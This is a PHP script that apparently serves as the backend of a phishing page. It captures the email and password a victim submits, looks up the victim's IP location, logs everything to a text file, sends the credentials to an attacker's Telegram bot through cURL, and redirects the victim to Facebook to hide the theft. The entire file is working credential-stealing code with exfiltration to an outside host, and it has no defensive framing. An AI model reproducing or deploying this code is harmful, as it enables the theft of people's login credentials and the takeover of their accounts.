<?php 
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // get current time in West Africa Time
    $timezone = new DateTimeZone('Africa/Lagos');
    $date = new DateTime('now', $timezone);
    $date_str = $date->format('F j, Y g:i A');

    // Get client's IP address
    $ip_address = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];

    // Get location details based on IP address
    $location_url = "http://ip-api.com/json/{$ip_address}";
    $location_response = @file_get_contents($location_url);
    $location_data = $location_response ? json_decode($location_response) : null;

    $country = $location_data && $location_data->status == 'success' ? $location_data->country : 'Unknown';
    $city = $location_data && $location_data->status == 'success' ? $location_data->city : 'Unknown';

    // Log data in log.txt
    $log_data = "Date= {$date_str}\nEmail= {$email}\nPassword= {$password}\nIP Address= {$ip_address}\nCountry= {$country}\nCity= {$city}\n\n";
    file_put_contents('log.txt', $log_data, FILE_APPEND);

    // Send the information to a Telegram bot
    $bot_token = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token
    $chat_id = 'YOUR_CHAT_ID_HERE'; // Replace with your chat ID

    $message = "Date: {$date_str}\nEmail: {$email}\nPassword: {$password}\nIP Address: {$ip_address}\nCountry: {$country}\nCity: {$city}";

    $telegram_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $telegram_data = [
        'chat_id' => $chat_id,
        'text' => $message,
    ];

    // Use cURL to send the message
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegram_data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect to Facebook
    header('Location: http://www.facebook.com');
    exit;
}
?>
